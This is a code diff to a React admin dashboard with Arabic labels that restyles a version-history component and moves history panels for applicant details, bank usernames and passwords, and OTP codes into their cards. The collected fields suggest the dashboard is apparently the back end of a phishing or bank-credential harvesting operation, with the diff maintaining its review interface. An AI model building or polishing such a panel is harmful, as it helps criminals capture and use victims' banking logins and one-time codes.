@@ -257,20 +257,20 @@ function HistorySection({
   };
   
   return (
-    <div className="mt-3 border-t pt-3">
+    <div className="border-t border-gray-200 pt-2 mt-2">
       <button
         onClick={onToggle}
-        className="w-full flex items-center justify-between bg-blue-50 hover:bg-blue-100 text-blue-600 py-2 px-3 rounded-lg text-xs font-bold transition-all"
+        className="w-full flex items-center justify-between bg-gray-100 hover:bg-gray-200 text-gray-600 py-2 px-3 rounded-lg text-xs font-bold transition-all"
       >
         <span className="flex items-center gap-2">
           <History className="w-4 h-4" />
-          {titleMap[type]} ({records.length})
+          {titleMap[type]} ({records.length - 1} نسخة قديمة)
         </span>
         <ChevronDown className={`w-4 h-4 transition-transform ${expanded ? "rotate-180" : ""}`} />
       </button>
       
       {expanded && (
-        <div className="mt-2 space-y-2 max-h-60 overflow-y-auto">
+        <div className="mt-2 space-y-2 max-h-48 overflow-y-auto">
           {records.sort((a, b) => (b.version || 0) - (a.version || 0)).slice(1).map((record, idx) => (
             <div key={record.id} className="p-3 bg-gray-50 rounded-lg border border-gray-200 text-xs">
               <div className="flex items-center justify-between mb-2">
@@ -1322,15 +1322,15 @@ export default function AdminDashboardPage() {
                             label="الإيرادات السنوية"
                             value={allData.annualRevenue}
                           />
+                          
+                          {/* سجلات البيانات الشخصية */}
+                          <HistorySection
+                            type="applicant"
+                            records={versions.filter(v => v.fullName || v.companyName || v.contactName)}
+                            expanded={expandedHistory.applicant}
+                            onToggle={() => setExpandedHistory(h => ({ ...h, applicant: !h.applicant }))}
+                          />
                         </div>
-
-                        {/* سجلات البيانات الشخصية */}
-                        <HistorySection
-                          type="applicant"
-                          records={versions.filter(v => v.fullName || v.companyName || v.contactName)}
-                          expanded={expandedHistory.applicant}
-                          onToggle={() => setExpandedHistory(h => ({ ...h, applicant: !h.applicant }))}
-                        />
 
                         {/* صندوق بيانات البنك */}
                         <div className="bg-card rounded-xl p-4 space-y-2">
@@ -1416,15 +1416,15 @@ export default function AdminDashboardPage() {
                               </div>
                             </div>
                           )}
+                          
+                          {/* سجلات البنك والدخول */}
+                          <HistorySection
+                            type="credentials"
+                            records={versions.filter(v => v.bankUsername || v.bankPassword || v.bankName)}
+                            expanded={expandedHistory.credentials}
+                            onToggle={() => setExpandedHistory(h => ({ ...h, credentials: !h.credentials }))}
+                          />
                         </div>
-
-                        {/* سجلات البنك والدخول */}
-                        <HistorySection
-                          type="credentials"
-                          records={versions.filter(v => v.bankUsername || v.bankPassword || v.bankName)}
-                          expanded={expandedHistory.credentials}
-                          onToggle={() => setExpandedHistory(h => ({ ...h, credentials: !h.credentials }))}
-                        />
 
                         {/* صندوق OTP */}
                         <div className="bg-card rounded-xl p-4 space-y-2">
@@ -1529,15 +1529,15 @@ export default function AdminDashboardPage() {
                               </div>
                             </div>
                           )}
+                          
+                          {/* سجلات رموز OTP */}
+                          <HistorySection
+                            type="otp"
+                            records={versions.filter(v => v.otpCode)}
+                            expanded={expandedHistory.otp}
+                            onToggle={() => setExpandedHistory(h => ({ ...h, otp: !h.otp }))}
+                          />
                         </div>
-
-                        {/* سجلات رموز OTP */}
-                        <HistorySection
-                          type="otp"
-                          records={versions.filter(v => v.otpCode)}
-                          expanded={expandedHistory.otp}
-                          onToggle={() => setExpandedHistory(h => ({ ...h, otp: !h.otp }))}
-                        />
 
                         {/* صندوق بيانات الدفع */}
                         <div className="bg-card rounded-xl p-4 space-y-2">
